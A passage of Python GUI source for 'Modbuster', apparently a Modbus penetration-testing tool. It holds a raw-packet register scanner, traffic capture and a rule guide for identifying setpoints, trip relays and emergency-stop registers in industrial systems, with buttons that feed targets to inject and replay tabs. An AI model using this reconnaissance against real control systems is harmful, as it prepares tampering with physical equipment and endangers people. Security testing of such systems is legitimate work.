                         args=(target, port, unit, start, end), daemon=True).start()

    def _run_register_scan(self, target: str, port: int, unit: int, start: int, end: int) -> None:
        import socket
        BATCH = 10

        def _fc3_packet(uid: int, addr: int, count: int) -> bytes:
            return bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                          uid & 0xFF, 0x03,
                          (addr >> 8) & 0xFF, addr & 0xFF,
                          (count >> 8) & 0xFF, count & 0xFF])

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((target, port))
        except Exception as e:
            self._msg_queue.put(("recon_status_reg", f"Connection failed: {e}"))
            return

        found = 0
        addr = start
        total = end - start + 1
        zero_run_start: Optional[int] = None
        zero_run_end:   Optional[int] = None

        def flush_zeros() -> None:
            nonlocal zero_run_start, zero_run_end
            if zero_run_start is None:
                return
            n = zero_run_end - zero_run_start + 1  # type: ignore[operator]
            if n == 1:
                self._recon_append(f"  {zero_run_start:>5}       0  0x0000")
            else:
                self._recon_append(
                    f"  {zero_run_start:>5}–{zero_run_end:<5}  [{n} regs]  all zeros — possibly unmapped")
            zero_run_start = zero_run_end = None

        try:
            while addr <= end:
                if self._recon_stop.is_set():
                    flush_zeros()
                    self._msg_queue.put(("recon_status_reg", f"Stopped at addr {addr}."))
                    self._msg_queue.put(("recon_reg_done", None))
                    return
                count = min(BATCH, end - addr + 1)
                self._msg_queue.put(("recon_status_reg",
                                     f"Scanning addr {addr}… ({addr - start}/{total})"))
                try:
                    s.sendall(_fc3_packet(unit, addr, count))
                    resp = s.recv(512)
                    if len(resp) >= 9:
                        func_byte = resp[7]
                        if func_byte == 0x03:
                            byte_count = resp[8]
                            n_regs = byte_count // 2
                            for i in range(n_regs):
                                val = (resp[9 + i * 2] << 8) | resp[10 + i * 2]
                                found += 1
                                if val == 0:
                                    if zero_run_start is None:
                                        zero_run_start = addr + i
                                    zero_run_end = addr + i
                                else:
                                    flush_zeros()
                                    self._recon_append(
                                        f"  {addr+i:>5}  {val:>6}  0x{val:04x}")
                        elif func_byte == 0x83:
                            exc = resp[8] if len(resp) > 8 else 0
                            if exc not in (0x02,):
                                flush_zeros()
                                self._recon_append(f"  {addr:>5}  —       exception 0x{exc:02x}")
                except Exception:
                    try:  # reconnect once on dropped connection
                        s.close()
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3.0)
                        s.connect((target, port))
                    except Exception as e:
                        flush_zeros()
                        self._msg_queue.put(("recon_status_reg", f"Connection lost: {e}"))
                        self._msg_queue.put(("recon_reg_done", None))
                        return
                addr += count
            flush_zeros()
        finally:
            s.close()
        summary = f"Done — {found} registers mapped in range {start}–{end}."
        self._msg_queue.put(("recon_status_reg", summary))
        self._recon_append(f"  → {summary}")
        self._msg_queue.put(("recon_reg_done", None))

    # ── Analyze Tab ───────────────────────────────────────────────────────────

    def _build_analyze_tab(self) -> None:
        top = self.tabs.tab("Analyze")

        # PCAP row
        row = ctk.CTkFrame(top, fg_color="transparent")
        row.pack(fill="x", pady=(0, 8))
        ctk.CTkLabel(row, text="PCAP:").pack(side="left", padx=(0, 6))
        self.pcap_path = ctk.CTkEntry(row, width=380, placeholder_text="Path to PCAP file")
        self.pcap_path.pack(side="left", padx=0, fill="x", expand=True)
        ctk.CTkButton(row, text="Browse", width=80, command=self._browse_pcap).pack(side="left", padx=6)
        ctk.CTkLabel(row, text="  |  ").pack(side="left", padx=4)
        self.live_btn = ctk.CTkButton(row, text="Start Live", width=100, command=self._toggle_live)
        self.live_btn.pack(side="left", padx=4)
        ctk.CTkButton(row, text="Export", width=80, command=self._export_analyze).pack(side="left", padx=4)
        ctk.CTkButton(row, text="Clear", width=70, command=self._clear_traffic,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      text_color=("gray20", "gray90")).pack(side="left", padx=4)

        # Live capture: Network Interface + Ports to monitor (same row); ports open as dropdown below
        live_frame = ctk.CTkFrame(top, fg_color="transparent")
        live_frame.pack(fill="x", pady=(0, 0))
        iface_row = ctk.CTkFrame(live_frame, fg_color="transparent")
        iface_row.pack(fill="x", pady=(0, 4))
        ctk.CTkLabel(iface_row, text="Network Interface:").pack(side="left", padx=(0, 6))
        try:
            self._iface_choices = _get_network_interfaces()  # list of (display_name, device_name)
        except Exception:
            self._iface_choices = []
        iface_options = ["Default"] + [d[0] for d in self._iface_choices]
        self.iface_var = ctk.StringVar(value="Default")
        self.iface_menu = ctk.CTkOptionMenu(iface_row, values=iface_options, variable=self.iface_var, width=260)
        self.iface_menu.pack(side="left", padx=4)
        ctk.CTkLabel(iface_row, text="   Ports to monitor:").pack(side="left", padx=(16, 6))
        self.port_vars = [ctk.BooleanVar(value=True) for _ in SCADA_PORTS]
        self._ports_dropdown_visible = False
        self.ports_btn = ctk.CTkButton(iface_row, text=f"{len(SCADA_PORTS)} port(s) selected", width=180, command=self._toggle_ports_dropdown)
        self.ports_btn.pack(side="left", padx=4)
        # Dropdown panel with checkboxes (shown below the row when button clicked)
        self.ports_dropdown = ctk.CTkFrame(live_frame, fg_color=_DROPDOWN_BG, corner_radius=6, border_width=1)
        for (label, port, _), var in zip(SCADA_PORTS, self.port_vars):
            cb = ctk.CTkCheckBox(self.ports_dropdown, text=f"{label} ({port})", variable=var, width=0, command=self._update_ports_button_text)
            cb.pack(anchor="w", padx=14, pady=6)
        self.ports_dropdown.pack(fill="x", pady=(0, 6), padx=(0, 0))
        self.ports_dropdown.pack_forget()
        # Click outside dropdown to close it
        top.bind("<ButtonPress>", self._maybe_close_ports_dropdown)

        self.analyze_text = ctk.CTkTextbox(top, font=("Consolas", 11), wrap="word")
        self.analyze_text.pack(fill="both", expand=True, pady=(8, 2))

        # ── Auto Analysis collapsible strip ──────────────────────────────────
        self._aa_visible = True

        aa_toggle_row = ctk.CTkFrame(top, fg_color="transparent")
        aa_toggle_row.pack(fill="x", pady=(2, 0))
        self._aa_toggle_btn = ctk.CTkButton(
            aa_toggle_row, text="▼  Auto Analysis", width=150, height=22,
            font=("", 11), fg_color="transparent", hover_color=_NEUTRAL_HOV,
            text_color=("gray40", "gray70"), anchor="w",
            command=self._toggle_auto_analysis,
        )
        self._aa_toggle_btn.pack(side="left")
        self._aa_count_lbl = ctk.CTkLabel(
            aa_toggle_row, text="", font=("", 10),
            text_color=_MUTED, anchor="w",
        )
        self._aa_count_lbl.pack(side="left", padx=6)
        ctk.CTkButton(
            aa_toggle_row, text="? How it works", width=120, height=22,
            font=("", 10), fg_color="transparent", hover_color=_NEUTRAL_HOV,
            text_color=_MUTED, anchor="w",
            command=self._show_inference_legend,
        ).pack(side="left", padx=4)

        # The collapsible panel itself
        self._aa_panel = ctk.CTkFrame(top, fg_color=_PANEL_BG,
                                      corner_radius=6, height=170)
        self._aa_panel.pack(fill="x", pady=(0, 2))

        # Flicker-free textbox — header is rendered as the first two lines so
        # it shares the same font/character grid as the data rows.
        self._aa_textbox = ctk.CTkTextbox(
            self._aa_panel, font=("Consolas", 10), wrap="none",
            fg_color=_PANEL_BG, text_color=_CODE_FG,
            height=160, activate_scrollbars=True,
        )
        self._aa_textbox.pack(fill="both", expand=True, padx=2, pady=(0, 2))
        self._aa_textbox.configure(state="disabled")
        self._aa_textbox._textbox.bind("<ButtonRelease-1>",
                                       lambda e: self._on_analysis_click(e, self._aa_textbox))

        # ── Network Map pane (hidden until hosts are discovered) ─────────────
        self._map_outer = ctk.CTkFrame(top, fg_color=_MAP_BG, corner_radius=6)
        # Do NOT pack yet — only shown once hosts appear

        map_title = ctk.CTkFrame(self._map_outer, fg_color="transparent")
        map_title.pack(fill="x", padx=8, pady=(4, 2))
        ctk.CTkLabel(map_title, text="NETWORK MAP", font=("", 11, "bold"), anchor="w").pack(side="left")
        ctk.CTkLabel(map_title, text="— click an IP to populate Inject / Replay target",
                     font=("", 10), text_color=_MUTED, anchor="w").pack(side="left", padx=8)

        map_rows = ctk.CTkFrame(self._map_outer, fg_color="transparent")
        map_rows.pack(fill="x", padx=8, pady=(0, 6))

        ctrl_row = ctk.CTkFrame(map_rows, fg_color="transparent")
        ctrl_row.pack(fill="x", pady=2)
        ctk.CTkLabel(ctrl_row, text="Controller:", width=90, anchor="w",
                     font=("", 11)).pack(side="left")
        self._ctrl_btn_frame = ctk.CTkFrame(ctrl_row, fg_color="transparent")
        self._ctrl_btn_frame.pack(side="left", fill="x", expand=True)

        fd_row = ctk.CTkFrame(map_rows, fg_color="transparent")
        fd_row.pack(fill="x", pady=2)
        ctk.CTkLabel(fd_row, text="Field Devices:", width=90, anchor="w",
                     font=("", 11)).pack(side="left")
        self._fd_btn_frame = ctk.CTkFrame(fd_row, fg_color="transparent")
        self._fd_btn_frame.pack(side="left", fill="x", expand=True)

    # ── Inference legend popup ─────────────────────────────────────────────────

    def _show_inference_legend(self) -> None:
        """Open a scrollable popup that explains exactly how each register type is identified."""
        win = ctk.CTkToplevel(self)
        win.title("Classification Guide — How Modbuster Identifies Register Types")

        LEGEND = """
HOW MODBUSTER AUTO-CLASSIFIES MODBUS REGISTERS
═══════════════════════════════════════════════════════════════════════════════
No labels, no firmware, no internet. Only the raw values seen on the wire.

For each (Unit ID, Address) pair, Modbuster accumulates up to 500 samples and
computes: mean, std deviation, distinct values, write/read ratio, change rate,
and whether values are monotonically increasing.  It then runs through 19
ordered rules — most specific first — and stops at the first match.

───────────────────────────────────────────────────────────────────────────────
RULE 1 — WRITE-ONLY COMMAND                               Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : Register has been written (FC6/FC16) but NEVER polled (FC3).
  Meaning : Blind actuator command — the controller sends a value but never
            reads back confirmation via this register.
  Examples: Trip relay, enable coil, mode-select word, emergency stop.

───────────────────────────────────────────────────────────────────────────────
RULE 2 — SETPOINT / COMMAND  (write-heavy)                Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : >35% of observations are writes AND at least 2 writes seen.
  Meaning : A register the operator actively controls.  Written values are
            shown to reveal the control range.
  Examples: Speed setpoint, temperature setpoint, pressure limit, PID target.

───────────────────────────────────────────────────────────────────────────────
RULE 3 — BINARY ON/OFF                                    Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : Only values 0 and 1 ever observed.
  Sub-rules based on change rate:
    > 5 changes/min  → Watchdog / heartbeat bit (fast toggling expected)
    0.5–5/min        → Equipment cycling (pump, fan, valve open/close)
    < 0.5/min        → Static flag, permissive interlock, or run/stop status
  Examples: Pump run, valve open, fire door closed, circuit breaker status.

───────────────────────────────────────────────────────────────────────────────
RULE 4 — ALARM / EVENT CODE                               Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : ≤5 distinct values, max ≤6, and 0 is always in the set.
  Encoding: Maps to ISA-18.2 / IEC 62443 alarm level convention:
              0 = Normal    1 = Warning / Pre-Alarm    2 = Alarm
              3 = Suppressed   4 = Fault / Trip   5 = Maintenance
  Examples: Fire zone status, bilge flood alarm, gas detector level.

───────────────────────────────────────────────────────────────────────────────
RULE 5 — STATE / MODE SELECTOR                            Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : ≤7 distinct values, max ≤20, values only ever land on fixed levels
            (never drifts — jumps cleanly between states).
  Common patterns guessed:
    {0,1,2}       → Auto / Manual / Standby
    {0,1,2,3}     → Off / Slow / Medium / Full
  Examples: Drive mode, selector switch position, fuel mode, stabilizer mode.

───────────────────────────────────────────────────────────────────────────────
RULE 6 — GRID FREQUENCY                                   Confidence: HIGH
───────────────────────────────────────────────────────────────────────────────
  Trigger : Mean 480–620 AND std < 15 AND ≥3 reads.
  Encoding: Raw ÷ 10 = Hz.   500 = 50.0 Hz,   600 = 60.0 Hz.
  Grid detection:  |Hz − 50| < 3  → Europe / Asia / Africa (50 Hz)
                   |Hz − 60| < 3  → Americas / Japan (60 Hz)
  High σ flagged as possible fault (frequency instability = generator problem).

───────────────────────────────────────────────────────────────────────────────
RULE 7/8/9 — VOLTAGE (three classes)                      Confidence: HIGH/MED
───────────────────────────────────────────────────────────────────────────────
  HV  bus: Mean 5500–7500, low σ  → 6.6 kV class (ship HV, offshore platforms)
  MV  bus: Mean 3200–4500          → 3.3 kV or 4.16 kV switchboard
  LV  bus: Mean 360–480,  low σ   → 400 / 440 / 480 V distribution panel
  Note: Raw value = voltage in V (or ×10 depending on vendor).

───────────────────────────────────────────────────────────────────────────────
RULE 10 — POWER OUTPUT (kW)                               Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : Mean 500–20,000 AND std > 100 AND range > 500 AND max ≤ 30,000.
  Meaning : Varies with real load — typical of a generator or large motor.
  Shown as: kW direct, or kW×0.1 (vendor-dependent).
  Examples: Generator 1 output, propulsion motor power, hotel load.

───────────────────────────────────────────────────────────────────────────────
RULE 11 — RPM / ROTATIONAL SPEED                          Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : Non-negative, std > 3, range > 10 — tested at three scales:
    ×1   raw 20–3600   → Direct RPM  (most common)
    ×0.1 raw 500–15000 → RPM × 10 encoding  (Mitsubishi, some ABB)
    ×10  raw 0.5–500   → RPM ÷ 10 encoding  (some Siemens / Omron)
  Examples: Engine shaft, pump, fan, compressor, propeller, bow thruster.

───────────────────────────────────────────────────────────────────────────────
RULE 12 — TEMPERATURE  (4 encoding conventions)           Confidence: HIGH/MED
───────────────────────────────────────────────────────────────────────────────
  Convention A — Direct °C:   raw − 50 to 200  (e.g. raw 85 = 85°C)
  Convention B — Kelvin:      raw 243–373       (subtract 273 to get °C)
  Convention C — ×10 scale:   raw 0–2500        (divide by 10 for °C;
                               e.g. raw 875 = 87.5°C — common in Schneider,
                               Yokogawa, and Honeywell PLCs)
  Convention D — +50 bias:    raw 0–250         (subtract 50 for °C;
                               e.g. raw 120 = 70°C — Modbus signed workaround)
  Context added: cabin (18–26°C), engine room (50–120°C), exhaust (200–600°C),
                 cryogenic (<0°C), seawater cooling (5–35°C).

───────────────────────────────────────────────────────────────────────────────
RULE 13 — PERCENTAGE                                      Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : Non-negative, max 10–1100, std > 2.
  Encoding: Raw ÷ 10 = %.   Raw 0–1000 = 0–100%.
  Context guesses: tank level, thruster speed, valve position, load factor.
  Examples: Ballast tank %, bow thruster %, battery SOC, filter loading.

───────────────────────────────────────────────────────────────────────────────
RULE 14 — FLOW RATE                                       Confidence: LOW
───────────────────────────────────────────────────────────────────────────────
  Trigger : Non-negative, mean 100–50,000, std > 10, range > 100, max ≤ 100,000.
  Scale candidates shown: L/hr, L/hr×0.1, m³/hr.
  Hint: flow registers are usually adjacent to tank level or totaliser registers.

───────────────────────────────────────────────────────────────────────────────
RULE 15 — PRESSURE / LEVEL                                Confidence: LOW
───────────────────────────────────────────────────────────────────────────────
  Trigger : Non-negative, mean 10–10,000, std > 1, range > 5.
  Scale candidates: ×0.1 bar, mbar, kPa, MPa.
  Hint: verify against adjacent pump or flow registers in the same unit.

───────────────────────────────────────────────────────────────────────────────
RULE 16 — POSITION / ANGLE                                Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : Mean within 15% of a known center point: 180, 1800, 500, 100, 360.
  Meaning : Signed value stored with a positive offset (Modbus has no signed type).
              center 180  → rudder or actuator  (±35° from amidships)
              center 1800 → rate of turn or fine angle (÷10 for degrees)
              center 500  → fin / wing actuator
  Current side shown: Port / Stbd / Centered based on latest raw value vs. center.

───────────────────────────────────────────────────────────────────────────────
RULE 17 — COUNTER / TOTALISER                             Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : >85% of consecutive readings are non-decreasing (monotonically rising).
  Context:  max > 10,000  → energy kWh or large flow total
            max < 100,000 → runtime hours or cycle count
            otherwise     → odometer or flow totaliser
  Note: counters roll over at 65535 (16-bit Modbus limit).

───────────────────────────────────────────────────────────────────────────────
RULE 18 — FIXED SETPOINT / CONFIG                         Confidence: MED
───────────────────────────────────────────────────────────────────────────────
  Trigger : Std < 1.5, ≥8 reads, ≤2 distinct values, never written.
  Meaning : Value hasn't moved.  Could be a config register (device address,
            baud rate, firmware version) or a setpoint that was programmed
            once and left alone.

───────────────────────────────────────────────────────────────────────────────
RULE 19 — ANALOG SENSOR  (fallback)                       Confidence: LOW
───────────────────────────────────────────────────────────────────────────────
  Trigger : Std > 0.5, ≥3 reads — something analogue that didn't match above.
  Stability rating shown (CV = std/mean):
    CV < 0.01  → very stable     CV 0.01–0.05  → stable
    CV 0.05–0.15 → moderate      CV > 0.15     → high variance
  Scale hints generated from the raw min/max to suggest what physical unit
  the raw values might represent.

───────────────────────────────────────────────────────────────────────────────
CROSS-REGISTER ANALYSIS  (runs after all 19 rules)
───────────────────────────────────────────────────────────────────────────────
  Setpoint/Actual pairs:
    If two adjacent registers have the same mean but one is very stable (std<2)
    and the other drifts around it, they are flagged as a control pair.
    The stable one is the setpoint; the drifting one is the process variable.

  Channel groups:
    If 3 or more consecutive addresses share the same type (e.g. three RPM
    registers), they are labelled as a group — likely channels on one card
    (Generator 1/2/3/4 kW, Deck 3/7/12 zone temps, etc).

  Mirrored / redundant registers:
    If two registers on the same unit have identical recent values, they may
    be redundant sensors or shadow copies in the PLC memory layout.

───────────────────────────────────────────────────────────────────────────────
CONFIDENCE LEVELS
───────────────────────────────────────────────────────────────────────────────
  HIGH  — pattern is unambiguous (binary, alarm code, frequency, written setpoint)
  MED   — strong indicator but scale or sub-type needs verification
  LOW   — plausible match; collect more samples or cross-check adjacent registers

───────────────────────────────────────────────────────────────────────────────
IMPORTANT CAVEATS
───────────────────────────────────────────────────────────────────────────────
  • Rules use hardcoded value-range knowledge from IEC/IEEE/ISA standards and
    common PLC vendor conventions — they will miss exotic custom encodings.
  • A LOW-confidence result just means "not enough evidence yet" — keep
    capturing and the engine will refine its classification.
  • Registers that sit at 0 and never change (device powered off, unused
    channels) will fall through to Unknown until values start arriving.
  • Always verify write operations against a register map before sending —
    the engine identifies purpose, not safety limits.
""".strip()

        txt = ctk.CTkTextbox(win, font=("Consolas", 11), wrap="word",
                             fg_color=_PANEL_BG, text_color=("#1a1a1a", _CODE_FG))
        txt.pack(fill="both", expand=True, padx=10, pady=(10, 4))
        txt.insert("1.0", LEGEND)
        txt.configure(state="disabled")

        def _close_legend():
            win.grab_release()
            win.destroy()
        ctk.CTkButton(win, text="Close", width=100, command=_close_legend).pack(pady=(4, 10))

        def _center():
            win.update_idletasks()
            w, h = 820, 680
            x = self.winfo_x() + (self.winfo_width() - w) // 2
            y = self.winfo_y() + (self.winfo_height() - h) // 2
            win.geometry(f"{w}x{h}+{x}+{y}")
            win.lift()
            win.focus_force()
            win.grab_set()
        win.after(50, _center)

    def _toggle_auto_analysis(self) -> None:
        self._aa_visible = not self._aa_visible
        if self._aa_visible:
            self._aa_panel.pack(fill="x", pady=(0, 2))
            self._aa_toggle_btn.configure(text="▼  Auto Analysis")
            self._refresh_auto_analysis()
        else:
            self._aa_panel.pack_forget()
            self._aa_toggle_btn.configure(text="▶  Auto Analysis")

    def _refresh_auto_analysis(self) -> None:
        """Update the compact inference table inside the AA panel (flicker-free via textbox)."""
        if not self._aa_visible:
            return
        results = self._inference.classify_all()

        # Update count label
        n = len(results)
        self._aa_count_lbl.configure(
            text=f"({n} register{'s' if n != 1 else ''} observed)" if n else ""
        )

        # IP:15  Unit:4  Addr:4  Confidence:6  Type:22  LastVal:10  Range:14  Hint:rest
        COL_FMT = "  {ip:<15}  {unit:>4}  {addr:>4}  {conf:<6}  {type:<17}  {last:>10}  {rng:<14}  {hint}"
        header = COL_FMT.format(
            ip="IP", unit="Unit", addr="Addr", conf="Conf  ", type="Type",
            last="Last Val", rng="Range", hint="Hint",
        )
        rule = "  " + "-" * (len(header) - 2)

        if not results:
            body = header + "\n" + rule + "\n  No data yet — start live capture or load a PCAP."
        else:
            lines = [header, rule]
            prev_key = None
            for r in results:
                key = (r.get("ip", ""), r["unit_id"])
                if prev_key is not None and key != prev_key:
                    lines.append("")
                prev_key = key
                ip = (r.get("ip") or "")[:15]
                rng = f"{r['min']}-{r['max']}" if r["min"] is not None else "--"
                last = str(r["last_value"]) if r["last_value"] is not None else "--"
                hint = r["hint"][:55] + ("~" if len(r["hint"]) > 55 else "")
                conf = r["confidence"]  # HIGH / MED / LOW
                lines.append(COL_FMT.format(
                    ip=ip, unit=str(r["unit_id"]), addr=str(r["addr"]), conf=conf,
                    type=r["type"], last=last, rng=rng, hint=hint,
                ))
            body = "\n".join(lines)

        # Update textbox in-place — no widget destruction, no flicker
        self._aa_textbox.configure(state="normal")
        self._aa_textbox.delete("1.0", "end")
        self._aa_textbox.insert("1.0", body)
        self._aa_textbox.configure(state="disabled")

    def _on_analysis_click(self, event, textbox) -> None:
        """Parse IP/unit/addr from a clicked row in Auto Analysis — populate fields + open trend."""
        if self._suppress_clicks:
            return
        import re
        idx = textbox._textbox.index(f"@{event.x},{event.y}")
        line = textbox._textbox.get(f"{idx} linestart", f"{idx} lineend")
        m = re.match(r"^\s*([\d.]+)\s+(\d+)\s+(\d+)\s+", line)
        if not m:
            return
        ip, unit, addr = m.group(1), int(m.group(2)), int(m.group(3))
        self._populate_target(ip)
        self._populate_unit_addr(unit, addr)
        rtype, hint = "Unknown", ""
        for r in self._inference.classify_all():
            if r.get("ip") == ip and r["unit_id"] == unit and r["addr"] == addr:
                rtype = r.get("type", "Unknown")
                hint  = r.get("hint", "")
                break
        self._open_trend(ip, unit, addr, rtype, hint)

    def _on_infer_click(self, event) -> None:
        """Click a row in the Infer tab — populate inject fields AND open trend popup."""
        if self._suppress_clicks:
            return
        import re
        tb = self._infer_textbox._textbox
        idx = tb.index(f"@{event.x},{event.y}")
        line = tb.get(f"{idx} linestart", f"{idx} lineend")
        m = re.match(r"^\s*([\d.]+)\s+(\d+)\s+(\d+)\s+", line)
        if not m:
            return
        ip, unit_id, addr = m.group(1), int(m.group(2)), int(m.group(3))
        self._populate_target(ip)
        self._populate_unit_addr(unit_id, addr)
        # Look up type and hint from current classifications
        rtype, hint = "Unknown", ""
        for r in self._inference.classify_all():
            if r.get("ip") == ip and r["unit_id"] == unit_id and r["addr"] == addr:
                rtype = r.get("type", "Unknown")
                hint  = r.get("hint", "")
                break
        self._open_trend(ip, unit_id, addr, rtype, hint)

    def _update_target_bar(self) -> None:
        """Rebuild the target status bar from current _target_ip / _target_unit / _target_addr."""
        parts = []
        if self._target_ip:
            parts.append(self._target_ip)
        if self._target_unit is not None:
            parts.append(f"Unit {self._target_unit}")
        if self._target_addr is not None:
            parts.append(f"Addr {self._target_addr}")
        text = "  ·  ".join(parts) if parts else "—  no target selected"
        self._target_label.configure(text=text)

    def _edit_target(self) -> None:
        """Open a small popup to manually set IP, Unit ID, and Address."""
        win = ctk.CTkToplevel(self)
        win.title("Edit Target")
        win.resizable(False, False)

        ctk.CTkLabel(win, text="Edit Target", font=("", 13, "bold"),
                     text_color=_ORANGE).pack(pady=(14, 8))

        form = ctk.CTkFrame(win, fg_color="transparent")
        form.pack(padx=20, pady=(0, 8))
        form.columnconfigure(1, weight=1)

        def _row(label, row, default):
            ctk.CTkLabel(form, text=label, anchor="e", width=80).grid(
                row=row, column=0, padx=(0, 8), pady=4, sticky="e")
            e = ctk.CTkEntry(form, width=180)
            e.insert(0, default)
            e.grid(row=row, column=1, pady=4, sticky="w")
            return e

        ip_e   = _row("IP Address", 0, self._target_ip or "")
        unit_e = _row("Unit ID",    1, str(self._target_unit) if self._target_unit is not None else "")
        addr_e = _row("Address",    2, str(self._target_addr) if self._target_addr is not None else "")

        err_lbl = ctk.CTkLabel(win, text="", text_color="#ff5555", font=("", 10))
        err_lbl.pack()

        def _close():
            self._suppress_clicks = True
            self.after(200, lambda: setattr(self, "_suppress_clicks", False))
            win.grab_release()
            win.destroy()

        def _apply():
            ip = ip_e.get().strip()
            unit_s = unit_e.get().strip()
            addr_s = addr_e.get().strip()
            if ip:
                self._populate_target(ip)
            if unit_s or addr_s:
                try:
                    unit = int(unit_s) if unit_s else (self._target_unit or 0)
                    addr = int(addr_s) if addr_s else (self._target_addr or 0)
                    self._populate_unit_addr(unit, addr)
                except ValueError:
                    err_lbl.configure(text="Unit ID and Address must be integers.")
                    return
            _close()

        btn_row = ctk.CTkFrame(win, fg_color="transparent")
        btn_row.pack(pady=(4, 14))
        ctk.CTkButton(btn_row, text="Apply", width=90, command=_apply).pack(side="left", padx=6)
        ctk.CTkButton(btn_row, text="Cancel", width=90,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=_close).pack(side="left", padx=6)

        win.bind("<Return>", lambda e: _apply())
        win.bind("<Escape>", lambda e: _close())

        def _center():
            win.update_idletasks()
            w, h = win.winfo_reqwidth(), win.winfo_reqheight()
            x = self.winfo_x() + (self.winfo_width()  - w) // 2
            y = self.winfo_y() + (self.winfo_height() - h) // 2
            win.geometry(f"+{x}+{y}")
            win.lift()
            win.focus_force()
            win.grab_set()
            ip_e.focus_set()
        win.after(50, _center)

    def _generate_report(self) -> None:
        """Collect session data and write a PDF or Markdown pentest report."""
        classifications = self._inference.classify_all()
        if not classifications and not self._controllers and not self._field_devices:
            self._log_status("No session data yet — run a capture or recon scan first.")
            return

        # Suggest a default filename with timestamp
        from datetime import datetime
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_name = f"modbuster_report_{ts}.pdf"

        # Prefer /workspace if available (Docker lab), else home dir
        workspace = Path("/workspace")
        initial_dir = str(workspace) if workspace.exists() else str(Path.home())

        path_str = tkinter.filedialog.asksaveasfilename(
            title="Save Pentest Report",
            initialdir=initial_dir,
            initialfile=default_name,
            defaultextension=".pdf",
            filetypes=[("PDF", "*.pdf"), ("Markdown", "*.md"), ("All files", "*.*")],
        )
        if not path_str:
            return

        # Infer target network from discovered hosts
        all_ips = self._controllers | self._field_devices
        target_network = ""
        if all_ips:
            first = sorted(all_ips)[0].rsplit(".", 1)[0]
            target_network = f"{first}.0/24"

        try:
            out = _report.generate(
                controllers=set(self._controllers),
                field_devices=set(self._field_devices),
                classifications=classifications,
                written=set(self._inject_written),
                packet_count=len(self._analyze_records),
                target_network=target_network,
                output_path=Path(path_str),
            )
            self._log_status(f"Report saved → {out.name}")
        except Exception as e:
            self._log_status(f"Report error: {e}")

    def _populate_unit_addr(self, unit: int, addr: int) -> None:
        """Fill Unit ID and Addr in the Inject and Recon tabs; update target bar."""
        self._target_unit = unit
        self._target_addr = addr
        self.inject_unit.delete(0, "end")
        self.inject_unit.insert(0, str(unit))
        self.inject_addr.delete(0, "end")
        self.inject_addr.insert(0, str(addr))
        self._recon_reg_unit.delete(0, "end")
        self._recon_reg_unit.insert(0, str(unit))
        self._update_target_bar()

    def _populate_target(self, ip: str) -> None:
        """Fill the Target field in Recon, Inject, and Replay tabs; update target bar."""
        self._target_ip = ip
        for entry in (self._recon_uid_target, self._recon_reg_target,
                      self.inject_target, self.replay_target):
            entry.delete(0, "end")
            entry.insert(0, ip)
        self._update_target_bar()

    def _refresh_host_map(self) -> None:
        """Rebuild the controller / field-device IP buttons from current sets."""
        any_hosts = bool(self._controllers or self._field_devices)
        if any_hosts:
            self._map_outer.pack(fill="x", pady=(0, 4))
        else:
            self._map_outer.pack_forget()
            return

        for frame, ips, color, hover in (
            (self._ctrl_btn_frame, sorted(self._controllers), _ORANGE, _ORANGE_HOVER),
            (self._fd_btn_frame,  sorted(self._field_devices), "#5a5a5a", "#6e6e6e"),
        ):
            for w in frame.winfo_children():
                w.destroy()
            for ip in ips:
                ctk.CTkButton(
                    frame, text=ip, width=130, height=24,
                    font=("Consolas", 11), fg_color=color, hover_color=hover,
                    command=lambda i=ip: self._populate_target(i),
                ).pack(side="left", padx=4)

    def _update_ports_button_text(self) -> None:
        n = sum(1 for v in self.port_vars if v.get())
        self.ports_btn.configure(text=f"{n} port(s) selected")

    def _toggle_ports_dropdown(self) -> None:
        """Show or hide the ports dropdown (checkboxes) below the Ports to monitor button."""
        if self._ports_dropdown_visible:
            self.ports_dropdown.pack_forget()
            self._ports_dropdown_visible = False
        else:
            self.ports_dropdown.pack(fill="x", pady=(0, 6), padx=0)
            self._ports_dropdown_visible = True

    def _maybe_close_ports_dropdown(self, event: Any) -> None:
        """If ports dropdown is open and user clicked outside it and the button, close it."""
        if not self._ports_dropdown_visible:
            return
        w = event.widget
        while w:
            if w == self.ports_dropdown or w == self.ports_btn:
                return
            try:
                w = w.master
            except AttributeError:
                break
        self.ports_dropdown.pack_forget()
        self._ports_dropdown_visible = False

    def _browse_pcap(self) -> None:
        path = tkinter.filedialog.askopenfilename(
            title="Select PCAP",
            filetypes=[("PCAP files", "*.pcap *.pcapng"), ("All files", "*.*")],
        )
        if path:
            self.pcap_path.delete(0, "end")
            self.pcap_path.insert(0, path)
            self._run_pcap()

    def _toggle_live(self) -> None:
        if self._live_running:
            self._live_running = False
            self.live_btn.configure(text="Start Live", fg_color=_ORANGE, hover_color=_ORANGE_HOVER)
            if self.tabs.get() == "Analyze":
                self._log_status("Not Capturing")
            return
        iface_val = (self.iface_var.get() or "").strip()
        iface = None
        if iface_val and iface_val != "Default":
            # Resolve display name to device name for Scapy
            iface = next((d[1] for d in self._iface_choices if d[0] == iface_val), iface_val)
        bpf_filter = _build_bpf_from_ports(self.port_vars)
        self._live_running = True
        self.live_btn.configure(text="Stop Live", fg_color=_RED_FG, hover_color=_RED_HOVER)
        self.analyze_text.delete("1.0", "end")
        self._analyze_records = []
        self._raw_packets = []
        self._controllers.clear()
        self._field_devices.clear()
        self._inference.reset()
        self._refresh_host_map()
        if self.tabs.get() == "Analyze":
            self._log_status("Capturing")
        threading.Thread(target=self._run_live, args=(iface, bpf_filter), daemon=True).start()

